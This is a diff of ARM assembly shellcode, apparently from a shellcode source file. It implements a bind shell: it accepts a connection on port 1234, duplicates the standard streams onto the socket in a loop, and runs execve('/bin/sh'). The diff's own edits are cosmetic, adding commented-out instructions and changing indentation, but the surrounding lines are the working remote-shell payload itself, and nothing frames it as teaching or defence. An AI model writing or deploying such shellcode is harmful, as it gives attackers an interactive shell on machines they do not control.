@@ -39,6 +39,7 @@ _start:
     svc    1    
     
     // r = accept(s, 0, 0);
+    // umull r1, r2, r0, r0
     eor    r2, r2, r2   // r2 = 0
     eor    r1, r1, r1   // r1 = 0
     mov    r0, r6       // r0 = s
@@ -58,7 +59,8 @@ dup_loop:
     sub    r1, #1       // 
     bpl    dup_loop
 
-    // execve("/bin/sh", NULL, NULL);
+    // execve("/bin/sh", NULL, NULL);    
+    // umull r1, r2, r0, r0    
     adr    r0, sh       // r0 = "/bin/sh" 
     eor    r2, r2, r2   // r2 = NULL
     eor    r1, r1, r1   // r1 = NULL
@@ -66,7 +68,7 @@ dup_loop:
     mov    r7, #11      // r7 = execve
     svc    1
 sin_port:    
-.word  0xd2040002
+    .word  0xd2040002
 sh:    
-.ascii "/bin/shX"
+    .ascii "/bin/shX"
 
